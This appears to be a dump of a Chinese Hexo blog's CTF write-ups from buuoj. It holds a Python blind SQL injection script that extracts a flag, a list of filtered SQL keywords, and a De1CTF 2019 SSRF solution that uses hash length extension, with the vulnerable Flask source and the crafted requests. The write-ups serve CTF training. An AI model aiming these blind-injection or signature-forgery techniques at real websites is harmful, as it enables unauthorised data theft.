align=\"center\">%20</th>\n<th>482</th>\n<th>SQL Injection Checked</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">AND</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">DELETE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">END-EXEC</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">GROUP</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INSERT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INTO</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">LIMIT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">OR</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UNION</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UPDATE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">+</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">/</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">*</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">`</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">“</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">||</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;&amp;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">%23</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\"><code>if,substr,ascii,&lt;,&gt;,=,(),/t</code>都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用<code>/t、( )代替</code></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Time    : 12&#x2F;27&#x2F;2019 6:11 PM</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class=\"line\">result &#x3D; &#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">for x in range(1, 43):</span><br><span class=\"line\">    high &#x3D; 126</span><br><span class=\"line\">    low &#x3D; 45</span><br><span class=\"line\">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    while high - low &gt; 1:</span><br><span class=\"line\">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&quot; % (x, mid)</span><br><span class=\"line\">        data &#x3D; &#123;</span><br><span class=\"line\">            &quot;id&quot;: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        time.sleep(0.3)</span><br><span class=\"line\">        res &#x3D; requests.post(url, data &#x3D; data)</span><br><span class=\"line\">        if &#39;Hello&#39; in res.text:</span><br><span class=\"line\">            low &#x3D; mid</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            high &#x3D; mid</span><br><span class=\"line\">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class=\"line\"></span><br><span class=\"line\">    if high - low &#x3D;&#x3D; 1:</span><br><span class=\"line\">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%d,1,2)&quot; % (x, high)</span><br><span class=\"line\">        data &#x3D; &#123;</span><br><span class=\"line\">            &quot;id&quot;: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response &#x3D; requests.post(url, data&#x3D;data)</span><br><span class=\"line\">        if &#39;Hello&#39; in response.text:</span><br><span class=\"line\">            result +&#x3D; chr(int(mid+1))</span><br><span class=\"line\">        else :</span><br><span class=\"line\">            result +&#x3D; chr(int(mid))</span><br><span class=\"line\">    else :</span><br><span class=\"line\">        result +&#x3D; chr(int(mid))</span><br><span class=\"line\">    print(result)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f</span><br><span class=\"line\">fl</span><br><span class=\"line\">fla</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag&#123;</span><br><span class=\"line\">flag&#123;a</span><br><span class=\"line\">flag&#123;a2</span><br><span class=\"line\">flag&#123;a22</span><br><span class=\"line\">flag&#123;a22c</span><br><span class=\"line\">flag&#123;a22cf</span><br><span class=\"line\">flag&#123;a22cf6</span><br><span class=\"line\">flag&#123;a22cf69</span><br><span class=\"line\">flag&#123;a22cf690</span><br><span class=\"line\">flag&#123;a22cf690-</span><br><span class=\"line\">flag&#123;a22cf690-3</span><br><span class=\"line\">flag&#123;a22cf690-34</span><br><span class=\"line\">flag&#123;a22cf690-342</span><br><span class=\"line\">flag&#123;a22cf690-342a</span><br><span class=\"line\">flag&#123;a22cf690-342a-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-8</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-88</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df3</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df33</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d446</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4469</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。</p>"},{"title":"Hello World","date":"2019-12-19T12:49:28.000Z","_content":"\n第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移\n\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2019-12-19 20:49:28\n---\n\n第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移\n\n","slug":"hello-world","published":1,"updated":"2019-12-27T03:47:02.604Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck4pc9e4x0006187ec60kfj7r","content":"<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>\n","site":{"data":{}},"excerpt":"","more":"<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>\n"},{"title":"buuoj刷题记录4","date":"2019-12-28T13:16:16.000Z","_content":"## [De1CTF 2019]SSRF Me\n\n### 0x00 基础\n\n大致了解flask框架，[CVE-2019-9948](http://www.security-database.com/detail.php?alert=CVE-2019-9948)：`urlopen（）可包含本地文件`，[哈希长度扩展攻击](https://www.freebuf.com/articles/web/31756.html) 。\n\n<!--more-->\n\n### 0x01 分析\n\n题目提示 `flag在./flag.txt中`。\n\n打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。\n\n\n```python\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print(resp)\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):  #对secert_key、param、action进行MD5运算  的结果与self.sign作比较\n            return True\n        else:\n            return False\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))  # urllib.unquote 相当与  urldecode\n    action = \"scan\"\n    return getSign(action, param)\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest() #对secert_key、param、action进行MD5摘要签名\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0',port=80)\n```\n\n分析代码，总共三条路由，`@app.route('/')`显示代码，`@app.route(\"/geneSign\", methods=['GET', 'POST'])`生成签名，`@app.route('/De1ta',methods=['GET','POST'])`获取参数并执行`Exec()`函数\n\n大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，`param=flag.txt`，`action` 中要含有 `read` 和 `scan`，且 `sign=md5(secert_key + param + action)`\n\n在`getSign`函数中，生成MD5签名的方式是`secert_key + param + action`其中`action=scan`，`secert_key`未知`param`可以控制。\n\n在`@app.route('/De1ta',methods=['GET','POST'])`中，`cookies`中的`action`必须为`readscan`，sign为\n\n`secert_key + param + scan`签名后的md5，使`param=flag.txtread`直接获取到签名后的md5。\n\n### 0x02 开始操作\n\n先获取到签名后的md5\n\n访问`http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread`\n\n返回为`0155303824bd0738b4ed0a52b7446c08`\n\n\n```\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08 \n```\n\n结果\n\n`{\"code\": 200, \"data\": \"flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n\"}`\n\n### 0x02 另一种解法\n\n使用hashdump 利用哈希长度扩展攻击，\n\n已知`（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9`\n\n求`（secret+flag.txt+scanread）`\n\n经过测试密钥是16位 加上scanread是24位。\n\n```\nroot@kali:/tmp/HashPump# hashpump \nInput Signature: 40ad0bf20e771e768e9305810410c1b9\nInput Data: scan   #写上原有数据\nInput Key Length: 24    #密钥长度+数据长度+拓展的数据长度\nInput Data to Add: read   #拓展的数据\n46a6ff04f7bede58de30e93410935976 #生成的MD5\nscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read \n```\n\n`burp suite`提交的数据\n\n```\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976\n\n```\n\n结果`{\"code\": 200, \"data\": \"flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n\"}`\n\n","source":"_posts/buuoj刷题记录4.md","raw":"---\ntitle: buuoj刷题记录4\ndate: 2019-12-28 21:16:16\ntags:\n - web \n - ctf  \n - buuctf\n - De1CTF\n---\n## [De1CTF 2019]SSRF Me\n\n### 0x00 基础\n\n大致了解flask框架，[CVE-2019-9948](http://www.security-database.com/detail.php?alert=CVE-2019-9948)：`urlopen（）可包含本地文件`，[哈希长度扩展攻击](https://www.freebuf.com/articles/web/31756.html) 。\n\n<!--more-->\n\n### 0x01 分析\n\n题目提示 `flag在./flag.txt中`。\n\n打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。\n\n\n```python\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print(resp)\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):  #对secert_key、param、action进行MD5运算  的结果与self.sign作比较\n            return True\n        else:\n            return False\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))  # urllib.unquote 相当与  urldecode\n    action = \"scan\"\n    return getSign(action, param)\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest() #对secert_key、param、action进行MD5摘要签名\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0',port=80)\n```\n\n分析代码，总共三条路由，`@app.route('/')`显示代码，`@app.route(\"/geneSign\", methods=['GET', 'POST'])`生成签名，`@app.route('/De1ta',methods=['GET','POST'])`获取参数并执行`Exec()`函数\n\n大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，`param=flag.txt`，`action` 中要含有 `read` 和 `scan`，且 `sign=md5(secert_key + param + action)`\n\n在`getSign`函数中，生成MD5签名的方式是`secert_key + param + action`其中`action=scan`，`secert_key`未知`param`可以控制。\n\n在`@app.route('/De1ta',methods=['GET','POST'])`中，`cookies`中的`action`必须为`readscan`，sign为\n\n`secert_key + param + scan`签名后的md5，使`param=flag.txtread`直接获取到签名后的md5。\n\n### 0x02 开始操作\n\n先获取到签名后的md5\n\n访问`http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread`\n\n返回为`0155303824bd0738b4ed0a52b7446c08`\n\n\n```\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08 \n```\n\n结果\n\n`{\"code\": 200, \"data\": \"flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n\"}`\n\n### 0x02 另一种解法\n\n使用hashdump 利用哈希长度扩展攻击，\n\n已知`（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9`\n\n求`（secret+flag.txt+scanread）`\n\n经过测试密钥是16位 加上scanread是24位。\n\n```\nroot@kali:/tmp/HashPump# hashpump \nInput Signature: 40ad0bf20e771e768e9305810410c1b9\nInput Data: scan   #写上原有数据\nInput Key Length: 24    #密钥长度+数据长度+拓展的数据长度\nInput Data to Add: read   #拓展的数据\n46a6ff04f7bede58de30e93410935976 #生成的MD5\nscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read \n```\n\n`burp suite`提交的数据\n\n```\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976\n\n```\n\n结果`{\"code\": 200, \"data\": \"flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n\"}`\n\n","slug":"buuoj刷题记录4","published":1,"updated":"2019-12-30T08:18:18.126Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck4s68np80000t47e7n0scb9i","content":"<h2 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>大致了解flask框架，<a href=\"http://www.security-database.com/detail.php?alert=CVE-2019-9948\" target=\"_blank\" rel=\"noopener\">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href=\"https://www.freebuf.com/articles/web/31756.html\" target=\"_blank\" rel=\"noopener\">哈希长度扩展攻击</a> 。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>\n<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">     